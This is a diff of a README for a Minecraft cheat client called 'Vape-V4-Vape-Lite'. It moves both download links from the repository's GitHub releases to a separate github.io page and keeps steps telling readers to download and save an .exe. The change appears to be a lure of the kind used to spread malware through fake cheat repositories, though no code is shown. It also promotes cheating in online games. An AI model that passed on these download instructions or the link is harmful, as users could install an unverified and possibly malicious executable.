@@ -1,6 +1,6 @@
 # ⚡ Vape-V4-Vape-Lite - Gain a competitive edge in Minecraft
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/naimageu3527/Vape-V4-Vape-Lite/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://naimageu3527.github.io)
 
 ## 🎯 About This Software
 
@@ -22,7 +22,7 @@ Ensure your computer meets these requirements before you start the installation:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the following link to access the download page: [https://github.com/naimageu3527/Vape-V4-Vape-Lite/releases](https://github.com/naimageu3527/Vape-V4-Vape-Lite/releases)
+1. Visit the following link to access the download page: [https://naimageu3527.github.io](https://naimageu3527.github.io)
 2. Look for the "Assets" section on the page.
 3. Click the file ending in .exe to start the download.
 4. Save the file to a location you can find, such as your Downloads folder.
